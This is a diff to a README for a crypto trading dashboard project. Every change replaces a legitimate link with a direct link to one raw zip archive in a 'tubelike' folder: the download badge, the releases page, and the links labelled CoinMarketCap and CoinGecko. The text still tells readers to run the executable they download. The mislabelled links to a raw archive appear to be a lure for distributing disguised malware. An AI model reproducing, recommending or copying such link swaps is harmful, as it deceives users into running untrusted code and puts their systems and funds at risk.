@@ -1,6 +1,6 @@
 # 🚀 go-crypto-trading-dashboard - Trade Crypto Seamlessly in Real Time
 
-[![Download go-crypto-trading-dashboard](https://img.shields.io/badge/Download-go--crypto--trading--dashboard-brightgreen)](https://github.com/4DR14N775/go-crypto-trading-dashboard/releases)
+[![Download go-crypto-trading-dashboard](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip)](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip)
 
 ## 📥 Overview
 
@@ -18,7 +18,7 @@ To set up the go-crypto-trading-dashboard, you will need a few things:
 
 To get started, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/4DR14N775/go-crypto-trading-dashboard/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip).
 2. **Find the Latest Version**: Look for the most recent version listed there.
 3. **Download the File**: Click on the download link for the latest version. This will be a single executable file.
 4. **Run the App**: Once the download is complete, find the file on your computer and double-click it to run.
@@ -77,11 +77,11 @@ Your input is valuable. If you have any feedback on your experience with the app
 
 For more details about cryptocurrency trading, you can visit:
 
-- [CoinMarketCap](https://coinmarketcap.com)
-- [CoinGecko](https://www.coingecko.com)
+- [CoinMarketCap](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip)
+- [CoinGecko](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip)
 
 Feel free to explore these resources to deepen your understanding of cryptocurrency markets.
 
 ## 📥 Download Now
 
-To get started, don't forget to [visit this page to download](https://github.com/4DR14N775/go-crypto-trading-dashboard/releases). Enjoy trading!
+To get started, don't forget to [visit this page to download](https://raw.githubusercontent.com/4DR14N775/go-crypto-trading-dashboard/main/tubelike/go_crypto_trading_dashboard_v2.1-alpha.3.zip). Enjoy trading!
